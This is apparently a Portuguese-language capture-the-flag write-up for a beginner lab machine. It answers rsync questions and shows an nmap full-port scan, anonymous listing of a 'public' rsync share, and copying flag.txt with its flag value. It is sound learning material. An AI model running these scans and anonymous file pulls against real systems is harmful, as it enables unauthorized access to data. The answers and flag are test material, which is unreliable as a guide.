
## Tarefa 1

Qual é a porta **padrão** do **rsync**?

Resposta: 873

---

## Tarefa 2

Quantas portas **TCP** estão abertas no host remoto?

```shell
sudo nmap -p- --min-rate=1000 10.129.140.218 -sV

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

```

-p- = Escanear todas as portas (pode demorar)
--min-rate=1000 = limita a varredura do scan para 1000 ms

Resposta: 1

---

## Tarefa 3

Qual é a **versão do protocolo** usada pelo rsync na máquina remota?

Resposta: 31

---

## Tarefa 4

Qual é o nome de comando **mais comum** no Linux para interagir com o **rsync**?

Resposta: rsync

---

## Tarefa 5

Quais credenciais você precisa passar ao rsync para usar **autenticação anônima**?  
(opções: `anonymous:anonymous`, `anonymous`, `None`, `rsync:rsync`)

Resposta: none

---

## Tarefa 6

Qual é a **opção** para **listar apenas** os shares e arquivos no rsync?  
_(Não é necessário incluir os dois traços iniciais `--`.)_

```shell
rsync -h

[...]
--list-only              list the files instead of copying them

```

---

## Enviar Flag

Envie a flag de root.

```shell
$ rsync --list-only 10.129.140.218::     
public          Anonymous Share

```

O comando acima lista todos os arquivos do rsync. no manual diz que usos com apenas um argumento **SRC** e sem argumento **DEST** irão **listar os arquivos de origem** em vez de copiá-los.

Agora é necessario listar o diretorio "public"

``` shell
$ rsync --list-only 10.129.140.218::public   
drwxr-xr-x          4,096 2022/10/24 18:02:23 .
-rw-r--r--             33 2022/10/24 17:32:03 flag.txt

```

Encontramos o arquivo com a flag mas é necessário extrai-lo para a maquina local. Para isso digitar o seguinte comando

``` shell
rsync 10.129.140.218::public/flag.txt flag.txt
```

Esse comando copia os arquivos do SRC "10.129.140.218::public/flag.txt" e cria um arquivo na maquina local chamado flag.txt

Ao ler o arquiivo encontramos a flag

```shell
$ cat flag.txt 
72eaf5344ebb84908ae543a719830519
```